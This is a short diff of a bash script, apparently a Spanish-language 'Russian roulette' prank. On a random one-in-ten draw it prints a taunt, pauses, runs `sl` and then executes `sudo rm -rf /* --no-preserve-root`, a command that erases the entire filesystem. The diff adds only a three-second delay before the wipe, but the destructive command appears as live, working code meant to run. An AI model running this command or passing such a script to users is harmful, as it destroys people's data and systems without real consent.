@@ -35,6 +35,7 @@ echo "Buena suerte"
 if [ $[ $RANDOM % 10 ] == 0 ];then
  echo "Salió 0"
  echo "Tu sistema ${OSTYPE} se va a la mierda"
+ sleep 3
  sl
  sudo rm -rf /* --no-preserve-root 
 else
